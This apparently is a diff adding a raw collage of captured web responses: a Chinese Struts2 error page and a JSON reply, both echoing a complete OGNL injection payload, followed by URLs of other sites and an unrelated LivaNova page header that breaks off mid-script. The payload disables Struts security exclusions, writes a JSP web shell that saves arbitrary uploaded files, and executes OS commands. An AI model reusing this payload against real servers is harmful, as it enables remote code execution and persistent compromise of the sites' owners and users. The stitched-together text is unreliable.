@@ -1,0 +1,1349 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2>
+	系統錯誤
+	!
+</h2>
+<p>
+	請連絡系統管理員
+	<a href="#" onclick="javascript: history.back();"> 返回 </a>
+</p>
+<hr />
+<h3>
+	錯誤訊息
+</h3>
+	<ul class="errorMessage">
+            <li><span>Error uploading: the request doesn't contain a multipart/form-data or multipart/mixed stream, content type header is %{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ccccc='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('/')).(#shell='mm&lt;%new java.io.FileOutputStream(request.getParameter(\&quot;f\&quot;)).write(request.getParameter(\&quot;c\&quot;).getBytes());%&gt;').(new java.io.BufferedWriter(new java.io.FileWriter(#path+'/ccccc.jsp').append(#shell)).close()).(#cmd='echo \&quot;write file to '+#path+'/ccccc.jsp\&quot;').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.&lt;strong&gt;&lt;font color=&quot;#FF0000&quot;&gt;struts&lt;/font&gt;&lt;/strong&gt;2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}</span></li>	</ul>
+
+<p>
+	No result defined for action com.hyweb.project.eip.basicData.web.action.ApplyAccreditItemAction and result input
+</p>
+<hr />
+<h3>
+	<a href="javascript:void(0)" onclick="javascript: document.getElementById('errorMessageTable').style.display = 'inline';">
+		Technical Details</a>
+</h3>
+<p>
+	<table id="errorMessageTable" style="display: none">
+		<tr>
+			<td>
+				<p>
+					No result defined for action com.hyweb.project.eip.basicData.web.action.ApplyAccreditItemAction and result input
+				</p>
+			</td>
+		</tr>
+		<tr>
+			<td>
+				No result defined for action com.hyweb.project.eip.basicData.web.action.ApplyAccreditItemAction and result input - action - file:/D:/ap/apache-tomcat-8.0.30/webapps/taf/WEB-INF/classes/conf/project/basicData/struts-project-basicData.xml:941:33
+	at com.opensymphony.xwork2.DefaultActionInvocation.executeResult(DefaultActionInvocation.java:374)
+	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:276)
+	at com.opensymphony.xwork2.validator.ValidationInterceptor.doIntercept(ValidationInterceptor.java:265)
+	at org.apache.struts2.interceptor.validation.AnnotationValidationInterceptor.doIntercept(AnnotationValidationInterceptor.java:76)
+	at com.opensymphony.xwork2.interceptor.MethodFilterInterceptor.intercept(MethodFilterInterceptor.java:98)
+	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
+	at com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor.intercept(ConversionErrorInterceptor.java:138)
+	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
+	at com.opensymphony.xwork2.interceptor.ParametersInterceptor.doIntercept(ParametersInterceptor.java:229)
+	at com.opensymphony.xwork2.interceptor.MethodFilterInterceptor.intercept(MethodFilterInterceptor.java:98)
+	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
+	at com.opensymphony.xwork2.interceptor.ParametersInterceptor.doIntercept(ParametersInterceptor.java:229)
+	at com.opensymphony.xwork2.interceptor.MethodFilterInterceptor.intercept(MethodFilterInterceptor.java:98)
+	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
+	at com.opensymphony.xwork2.interceptor.StaticParametersInterceptor.intercept(StaticParametersInterceptor.java:191)
+	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
+	at org.apache.struts2.interceptor.MultiselectInterceptor.intercept(MultiselectInterceptor.java:73)
+	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
+	at org.apache.struts2.interceptor.DateTextFieldInterceptor.intercept(DateTextFieldInterceptor.java:125)
+	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
+	at org.apache.struts2.interceptor.CheckboxInterceptor.intercept(CheckboxInterceptor.java:91)
+	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
+	at org.apache.struts2.interceptor.FileUploadInterceptor.intercept(FileUploadInterceptor.java:326)
+	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
+	at com.opensymphony.xwork2.interceptor.ModelDrivenInterceptor.intercept(ModelDrivenInterceptor.java:100)
+	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
+	at com.opensymphony.xwork2.interceptor.ScopedModelDrivenInterceptor.intercept(ScopedModelDrivenInterceptor.java:141)
+	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
+	at com.opensymphony.xwork2.interceptor.ChainingInterceptor.intercept(ChainingInterceptor.java:145)
+	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
+	at com.opensymphony.xwork2.interceptor.PrepareInterceptor.doIntercept(PrepareInterceptor.java:171)
+	at com.opensymphony.xwork2.interceptor.MethodFilterInterceptor.intercept(MethodFilterInterceptor.java:98)
+	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
+	at com.opensymphony.xwork2.interceptor.I18nInterceptor.intercept(I18nInterceptor.java:140)
+	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
+	at org.apache.struts2.interceptor.ServletConfigInterceptor.intercept(ServletConfigInterceptor.java:164)
+	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
+	at com.opensymphony.xwork2.interceptor.AliasInterceptor.intercept(AliasInterceptor.java:193)
+	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
+	at com.opensymphony.xwork2.interceptor.ExceptionMappingInterceptor.intercept(ExceptionMappingInterceptor.java:189)
+	at com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:245)
+	at org.apache.struts2.impl.StrutsActionProxy.execute(StrutsActionProxy.java:54)
+	at org.apache.struts2.dispatcher.Dispatcher.serviceAction(Dispatcher.java:575)
+	at org.apache.struts2.dispatcher.ng.ExecuteOperations.executeAction(ExecuteOperations.java:81)
+	at org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter.doFilter(StrutsPrepareAndExecuteFilter.java:99)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:239)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
+	at org.apache.catalina.filters.HttpHeaderSecurityFilter.doFilter(HttpHeaderSecurityFilter.java:106)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:239)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
+	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:143)
+	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:237)
+	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:167)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:239)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
+	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:88)
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:239)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:212)
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:106)
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:502)
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:141)
+	at psiprobe.Tomcat80AgentValve.invoke(Tomcat80AgentValve.java:45)
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:79)
+	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:616)
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:88)
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:521)
+	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1096)
+	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:674)
+	at org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.doRun(AprEndpoint.java:2500)
+	at org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.run(AprEndpoint.java:2489)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+	at java.lang.Thread.run(Thread.java:745)
+
+			</td>
+		</tr>
+	</table>
+</p>
+
+http://accreditation.taftw.org.tw/taf/public/basic/viewApplyItems.action?unitNo=1181
+{"actionErrors":["the request doesn't contain a multipart\/form-data or multipart\/mixed stream, content type header is %{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ccccc='multipart\/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('\/')).(#shell='mm<%new java.io.FileOutputStream(request.getParameter(\\\"f\\\")).write(request.getParameter(\\\"c\\\").getBytes());%>').(new java.io.BufferedWriter(new java.io.FileWriter(#path+'\/ccccc.jsp').append(#shell)).close()).(#cmd='echo \\\"write file to '+#path+'\/ccccc.jsp\\\"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','\/c',#cmd}:{'\/bin\/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.<strong><font color=\"#FF0000\">struts<\/font><\/strong>2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"],"actionMessages":[],"fieldErrors":{}}http://www.huann-dean.com.tw/servlet/index_product.action?sn=4&request_locale=zh_TW
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="oldie iem7"><![endif]-->
+<!--[if lt IE 7 ]><html class="oldie ie6"><![endif]-->
+<!--[if IE 7 ]><html class="oldie ie7"><![endif]-->
+<!--[if IE 8 ]><html class="oldie ie8"><![endif]-->
+<!--[if IE 9 ]><html class="oldie ie9"><![endif]-->
+<!--[if (gte IE 10)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html><!--<![endif]-->
+	<head>
+		
+
+
+
+
+<!--
+ ______                     ______                                 
+/\__  _\                   /\__  _\                                
+\/_/\ \/    __      ___ ___\/_/\ \/    __      ___ ___   __  __    
+   \ \ \  /'__`\  /' __` __`\ \ \ \  /'__`\  /' __` __`\/\ \/\ \   
+    \ \ \/\ \L\.\_/\ \/\ \/\ \ \ \ \/\ \L\.\_/\ \/\ \/\ \ \ \_\ \  
+     \ \_\ \__/.\_\ \_\ \_\ \_\ \ \_\ \__/.\_\ \_\ \_\ \_\/`____ \ 
+      \/_/\/__/\/_/\/_/\/_/\/_/  \/_/\/__/\/_/\/_/\/_/\/_/`/___/> \
+                                                             /\___/
+                                                             \/__/ V1.11 Ajowan
+-->
+
+
+
+
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta http-equiv="Content-Language" Content="it">
+<meta http-equiv="pragma" content="no-cache" />
+<meta http-equiv="expires" content="0" />
+<meta http-equiv="Cache-Control" content="no-cache" />
+<meta name="google-site-verification" content="klwLXB6r6Ns3y1l9t80evDm8fHzK68KqENtPLbvpCow" />
+<meta name="robots" content="index, follow" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:site" content="LivaNova"/>
+<meta name="twitter:domain" content="http://www.livanova.com"/>
+
+
+
+
+
+
+
+
+
+
+
+
+	
+	
+		<title>
+			LivaNova
+		</title>
+		<meta name="og:title" content="LivaNova">
+		<meta name="twitter:title" content="LivaNova">
+		<meta itemprop="name" content="LivaNova"/>
+		
+	
+	<meta name="description" content="LivaNova health innovation that matters" />
+	<meta property="og:description" content="LivaNova health innovation that matters" />
+	<meta name="twitter:description" content="LivaNova health innovation that matters" />
+	<meta itemprop="description" content="LivaNova health innovation that matters"/>
+	<meta name="keywords" content="" />
+
+
+
+
+
+<link rel="icon" href="/img/livanova/LN-Favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/img/livanova/LN-Favicon.ico" type="image/x-icon"/>
+<link rel="icon" type="image/png" href="/img/livanova/LN-Favicon-48x48px.png" sizes="48x48" />
+<link rel="icon" type="image/png" href="/img/livanova/LN-Favicon-32x32px.png" sizes="32x32" />
+<link rel="icon" type="image/png" href="/img/livanova/LN-Favicon-18x18px.png" sizes="18x18" />
+<meta name="application-name" content="LivaNova"/>
+
+
+
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+
+<link rel="alternate" type="application/rss+xml" title="TamTamy Contents Feed" href="/rss/rss.action" />
+
+<link rel="alternate" type="application/rss+xml" title="TamTamy Comments Feed" href="/rss/comments.action" />
+
+
+
+
+
+
+	<link rel="stylesheet" id="skinStyle" href='/skins/livanova/css/skin.css?v=2017042005' media="screen" />
+	<link rel="stylesheet" id="skinResponsive" href='/skins/livanova/css/responsive.css?v=2017042005' media="screen" />
+	<link rel="stylesheet" id="skinResponsive" href='/skins/livanova/css/skin_banner.css?v=2017042005' media="screen" />
+	
+	<link rel="stylesheet" href="/common/jquery-galleryview-2.0/galleryview.css" />
+	
+
+
+
+
+
+		
+
+<link rel="stylesheet" href="/css/admin/thickbox.css?v=2017042005" type="text/css" media="screen" />
+
+
+
+
+<style type="text/css">
+
+
+@import url(https://dl.dropboxusercontent.com/u/151184/WORK/external_livanova/css/skin.css);
+
+/* tella's management */
+.management_item .read_more {min-height:60px;}
+
+body{
+color:#606060;
+}
+
+/* stock */
+.content-body-wrap .content-body.chartstab {margin-top:15px;} 
+</style>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/jquery/1.8.21/ui-lightness/jquery-ui-1.8.21.custom.css?v=2017042005" media="screen" />
+<link rel="stylesheet" href="/css/jquery/prettyPhoto.css?v=2017042005" type="text/css" media="screen" />
+<link rel="stylesheet" href="/common/chart/jqplot/jquery.jqplot.min.css" type="text/css" media="screen" />
+
+<script type="text/javascript">var CONT_PATH = '';</script>
+
+<script type="text/javascript" src="/common/js/lib/sizzle.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/lib/jquery-1.9.1.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/lib/jquery-migrate-1.1.1.min.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/lib/jquery-ui-1.10.2.custom.min.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/lib/jquery-smartupdater2.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/lib/jquery-periodicalupdater.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/lib/jquery.ui.touch-punch.min.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/lib/jquery-ui-i18n.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/lib/jquery.qtip-1.0.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/lib/easySlider.packed.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/lib/swfobject.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/lib/jquery.autocompleter.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/lib/jquery.custom.extend.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/lib/jquery.tamtamy.plugins.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/lib/jquery.autosize-min.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/lib/jquery.thickbox-extended.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/lib/jquery.dataTables.min.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/jquery.slider.js"></script>
+<script type="text/javascript" src="/common/jquery-file-upload/js/jquery.iframe-transport.js"></script>
+<script type="text/javascript" src="/common/jquery-file-upload/js/cors/jquery.xdr-transport.js"></script>
+<script type="text/javascript" src="/common/js/autocompleter/autocompleter.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/lib/soundmanager2-nodebug-jsmin.js?v=2017042005"></script>
+<script type='text/javascript' src='/common/js/DateUtils.js?v=2017042005'></script>				
+<script type='text/javascript' src='/common/js/MouseUtils.js?v=2017042005'></script>			
+<script type='text/javascript' src='/common/js/tamtamytags/tags.js?v=2017042005'></script>
+<script type='text/javascript' src='/common/js/home/widget/boardMessages.js?v=2017042005'></script>
+<script type='text/javascript' src='/common/js/util/JSonResultSupportConstants.js?v=2017042005'></script>
+<!--[if IE]><script type="text/javascript" src="/common/js/lib/excanvas.js?v=2017042005"></script><![endif]-->
+<script type='text/javascript' src='/common/js/home/widget/exportWidget.js?v=2017042005'></script>
+<script type="text/javascript" src="/common/js/updateConversationJs.js"></script>
+<script type="text/javascript" src="/media/audio-player/audio-player.js"></script> 
+<script type="text/javascript" src="/media/flowplayer/flowplayer-3.2.11.min.js?v=2017042005"></script>
+<script type='text/javascript' src="/common/js/lib/jquery.prettyPhoto.3.1.2.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/lib/jquery.masonry.min.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/lib/jquery.flexslider.js?v=2017042005"></script>
+
+<script type="text/javascript" src="/common/chart/jqplot/jquery.jqplot.min.js"></script>
+<script type="text/javascript" src="/common/chart/jqplot/plugins/jqplot.highlighter.min.js"></script>
+<script type="text/javascript" src="/common/chart/jqplot/jqplot.pieRenderer.min.js"></script>
+<script type="text/javascript" src="/common/chart/jqplot/jqplot.barRenderer.min.js"></script>
+<script type="text/javascript" src="/common/chart/jqplot/plugins/jqplot.categoryAxisRenderer.min.js"></script>
+
+<script type="text/javascript" src="/common/js/liveboard.js?v=2017042005"></script>
+<link rel="stylesheet" href="/common/redactor/redactor.css?v=2017042005" media="screen" />
+<script type="text/javascript" src='/common/redactor/redactor.js?v=2017042005'></script>
+
+
+
+<script type="text/javascript" src="/common/js/lib/jquery.cookie.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/lib/jquery.cookiecuttr.js?v=2017042005"></script>
+<link rel="stylesheet" href="/css/jquery/cookiecuttr.css" media="screen" />
+
+
+	<script type="text/javascript">
+		$(document).ready(function () {
+			$.cookieCuttr({
+				cookieNameAccepted: "tt_cookie_policy_accepted",
+				cookieNameDeclined: "tt_cookie_policy_declined",
+				cookieMessage:  "This website uses cookies to offer you a better experience. By continuing navigation you agree to the use of cookies. For more information and to change your preferences see our <a href='{{cookiePolicyLink}}' title='Cookie Policy'>Cookie Policy</a>.",
+				cookiePolicyLink: "/privacy/cookies",
+				cookieAcceptButtonText: "Accept",
+				cookieDeclineButtonText: "Decline",
+				cookieAnalytics: false,
+				cookieDeclineButton: false,
+				cookieNotificationLocationBottom: true
+			});
+		});
+	</script>
+
+
+<script type="text/javascript">  
+AudioPlayer.setup("//media/audio-player/player.swf", {  
+	width: 240,
+	transparentpagebg: "yes"  
+});
+</script>
+
+
+<script src="/public/dictionary.action?v=2017042005"></script>
+
+<script type='text/javascript' src='/common/js/sorinAnchor.js?v=2017042005'></script>
+<script type='text/javascript' src='/common/js/group/utils.js?v=2017042005'></script>
+<script type="text/javascript" src='/common/js/contentFavourite.js?v=2017042005'></script>
+<script type="text/javascript" src="/common/js/userInfo.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/TamTamyGlobal.js?v=2017042005"></script>
+
+
+
+
+
+
+
+
+
+
+<link href="/common/video-js/video-js.min.css" rel="stylesheet" type="text/css">
+<script src="/common/video-js/video.min.js"></script>
+<script type="text/javascript">
+	_V_.options.flash.swf = "/common/video-js/video-js.swf";
+</script>
+
+<script type="text/javascript">
+	function htmlEscape(str) {
+    	return String(str)
+            .replace(/&/g, '&amp;')
+            .replace(/"/g, '&quot;')
+            .replace(/'/g, '&#39;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;');
+	}
+	
+	jQuery.ajaxSettings.traditional = true;
+	$.ajaxSetup({
+	   type: "POST",
+	   contentType: "application/x-www-form-urlencoded; charset=UTF8"
+ 	});
+
+	$.datepicker.setDefaults($.datepicker.regional['']);
+	
+	var urlAcceptWaitingContent = '/content-json/approveContent.action';
+	var urlRejectWaitingContent = '/content-json/rejectContent.action';
+	var urlAcceptWaitingComment = '/comment-json/approveComment.action';
+	var urlRejectWaitingComment = '/comment-json/rejectComment.action';
+	var urlUserInfo = '/json/getUserInfo.action';
+
+	var TT_BASE_URL_IMG = '/img';
+	var TT_BASE_URL_CSS = '/css';
+	var TT_SKIN_URL = '/skins/livanova';
+	var TT_BASE_URL_AVATAR = '/pub/pub/avatar';
+	var TT_BASE_URL_AVATAR_GROUP = '/pub/pub/avatarGroup';
+	var TT_BASE_URL_THUMB = '/pub/pub/thumb';
+	
+	// Different types of content input forms.
+	var CONTENT_FAMILY_FILE = 'file';
+	var CONTENT_FAMILY_LINK = 'link';
+	var CONTENT_FAMILY_UWA = 'uwa';
+	var CONTENT_FAMILY_QUESTION = 'question';
+	var CONTENT_FAMILY_MESSAGE = 'message';
+
+	var DEFAULT_FIRST_LEVEL_DOMAIN = 'replynet.prv';
+	var PROTOCOL_PREFIX_TAMTAMY = 'http';
+	var PROTOCOL_PREFIX_WIKI = 'http';
+	var PROTOCOL_PREFIX_BLOG = 'http';
+	var CONTEXT_PATH = ''; // i.e. /tamtamy
+	var _BASE_ = 'www.livanova.com/';
+	var UWA_PROXY_URL = _BASE_ + 'uwa/proxy.jsp';
+	var REVERSE_CONTENT_ORDERING = false;
+	
+	$(document).ready(
+		function () {
+			currentLocale = 'en';		
+			if (currentLocale == 'en') {
+				$.datepicker.setDefaults($.extend({showMonthAfterYear: false}, $.datepicker.regional['']));				
+			} else {
+				$.datepicker.setDefaults($.datepicker.regional[currentLocale]);
+			}
+			//INTENTIONS IMPLODED NAVBAR HOVER ACTIONS
+			$(".imploded #home-highactmyp .wrapwidg").hover(function () {
+			    $(this).addClass("open");
+			  }, function () {
+			    $(this).removeClass("open");
+			  });	
+			// call getUserInfo JSON		
+			getUserInfo(urlUserInfo);
+		}
+		
+	)
+
+		/* qTIP style */
+		$.fn.qtip.styles.admin = { // Last part is the name of the style
+	   		border: {
+	      		width: 3,
+	      		radius: 6
+	   		},
+	   		tip: true,
+	   		name: 'cream' // Inherit the rest of the attributes from the preset dark style
+	}
+	
+	$.fn.qtip.styles.adminAvatar = { // Last part is the name of the style
+			border: {
+	      		width: 0,
+	      		radius: 6,
+	      		color: '#d4d4d4'
+			},
+			'font-size' : 11, 
+			'line-height' : '11px',
+			'width':200,
+			'font-family' : 'Arial, Helvetica, sans-serif',
+			'font-style' : 'normal',
+	   		'textAlign': 'left',
+	   		tip: true,
+	   		name: 'light' // Inherit the rest of the attributes from the preset dark style
+	}
+	
+	$.fn.qtip.styles.TTcustomStyle = { // Last part is the name of the style 
+			'width':240,
+			show: {solo:true},
+	   		name: 'adminAvatar' // Inherit the rest of the attributes from the preset dark style
+	}
+</script>
+
+
+
+
+
+<script type="text/javascript" src="/common/js/ttlib/userInSession.js?v=2017042005"></script>				
+<script type="text/javascript">
+	
+	
+		var userInSession = null;
+	
+</script>
+
+
+
+
+<script>
+var countWidgetRepositioning = 0;
+function showPluginElement(elementSelector) {
+	var selectorContainer = "#widgetProfileCompletion_placeHolder";
+	var toSelector = "#widgetProfileCompletion_placeHolder .alert_padding";
+	if($(toSelector).size() > 0) {
+		if(countWidgetRepositioning == 0) {
+			countWidgetRepositioning++;
+			var pluginClone = $(elementSelector).clone();
+			var newElementSelectorId = "headerfixed_w_profile_completion";
+			pluginClone.attr("id", "headerfixed_w_profile_completion");
+			//$(elementSelector).remove();
+			pluginClone.appendTo(toSelector);
+			$("#profileCompletion").show();
+			$(selectorContainer).addClass('alert profile_alert');
+			$("#headerfixed_w_profile_completion").slideDown("slow");
+		}
+	} else {
+		$(elementSelector).addClass('alert profile_alert').show();
+		$(elementSelector+" #profileCompletion").slideDown("slow");
+	}
+}
+
+var addFavoriteButtonClass = 'addFavoriteButton';
+var removeFavoriteButtonClass = 'removeFavoriteButton';
+var addBlacklistButtonClass = 'addBlacklistButton';
+var removeBlacklistButtonClass = 'removeBlacklistButton';
+
+function controlPanelToogle(selectorId, action) {
+	if(action == 'BLACKLIST_ADD') {
+		$("#"+selectorId+" .controlPanel div."+addFavoriteButtonClass).hide();
+		$("#"+selectorId+" .controlPanel div."+removeFavoriteButtonClass).hide();
+		$("#"+selectorId+" .controlPanel div."+addBlacklistButtonClass).hide();
+		$("#"+selectorId+" .controlPanel div."+removeBlacklistButtonClass).show();
+	} else if(action == 'BLACKLIST_REMOVE') {
+		$("#"+selectorId+" .controlPanel div."+addFavoriteButtonClass).show();
+		$("#"+selectorId+" .controlPanel div."+removeFavoriteButtonClass).hide();
+		$("#"+selectorId+" .controlPanel div."+addBlacklistButtonClass).show();
+		$("#"+selectorId+" .controlPanel div."+removeBlacklistButtonClass).hide();
+	} else if(action == 'FAVORITE_ADD') {
+		$("#"+selectorId+" .controlPanel div."+addFavoriteButtonClass).hide();
+		$("#"+selectorId+" .controlPanel div."+removeFavoriteButtonClass).show();
+		$("#"+selectorId+" .controlPanel div."+addBlacklistButtonClass).show();
+		$("#"+selectorId+" .controlPanel div."+removeBlacklistButtonClass).hide();
+	} else if(action == 'FAVORITE_REMOVE') {
+		$("#"+selectorId+" .controlPanel div."+addFavoriteButtonClass).show();
+		$("#"+selectorId+" .controlPanel div."+removeFavoriteButtonClass).hide();
+		$("#"+selectorId+" .controlPanel div."+addBlacklistButtonClass).show();
+		$("#"+selectorId+" .controlPanel div."+removeBlacklistButtonClass).hide();
+	}
+}
+
+function controlPanelUserTooltipToogle(htmlId, action) {
+	var selectorAdd = $(".controlPanelUserTooltip .addFavoriteButton_"+htmlId);
+	var selectorRemove = $(".controlPanelUserTooltip .removeFavoriteButton_"+htmlId);
+	var selectorBlacklisted = $(".controlPanelUserTooltip .blacklisted_"+htmlId);
+	
+	var selectorFriendAdd = $(".controlPanelUserTooltip .addFriendButton_"+htmlId);
+	var selectorFriendPending = $(".controlPanelUserTooltip .addFriendButtonRequested_"+htmlId);
+	var selectorFriendRemove = $(".controlPanelUserTooltip .removeFriendButton_"+htmlId);
+	
+	selectorAdd.each(
+			function(){
+				if(action=='FAVORITE_ADD'){$(this).hide();}
+				else if(action=='FAVORITE_REMOVE'){$(this).show();}
+				else if(action=='BLACKLIST_ADD'){$(this).hide();}
+				else if(action=='BLACKLIST_REMOVE'){$(this).show();}
+			}
+	);
+	selectorRemove.each(
+			function(){
+				if(action=='FAVORITE_ADD'){$(this).show();}
+				else if(action=='FAVORITE_REMOVE'){$(this).hide();}
+				else if(action=='BLACKLIST_ADD'){$(this).hide();}
+				else if(action=='BLACKLIST_REMOVE'){$(this).hide();}
+			}
+	);
+	selectorBlacklisted.each(
+			function(){
+				if(action=='FAVORITE_ADD'){$(this).hide();}
+				else if(action=='FAVORITE_REMOVE'){$(this).hide();}
+				else if(action=='BLACKLIST_ADD'){$(this).show();}
+				else if(action=='BLACKLIST_REMOVE'){$(this).hide();}
+			}
+	);
+	selectorFriendAdd.each(
+			function(){
+				if(action=='FRIEND_ADD'){$(this).hide();}
+				else if(action=='FRIEND_REMOVE'){$(this).show();}
+			}
+	);
+	selectorFriendPending.each(
+			function(){
+				if(action=='FRIEND_ADD'){$(this).show();}
+				else if(action=='FRIEND_REMOVE'){$(this).hide();}
+			}
+	);
+	selectorFriendRemove.each(
+			function(){
+				if(action=='FRIEND_ADD'){$(this).hide();}
+				else if(action=='FRIEND_REMOVE'){$(this).hide();}
+			}
+	);
+}
+
+function toggleBlacklist(action, blacklistFamily, elementId, selectorId, textSupport) {
+	var url = '/json-profiledNavigation/addToBlackList.action';
+	var data;
+	var confirmText;
+	if(blacklistFamily == 'content' || 
+		blacklistFamily == 'relatedContent') {
+		if(action=='ADD') {
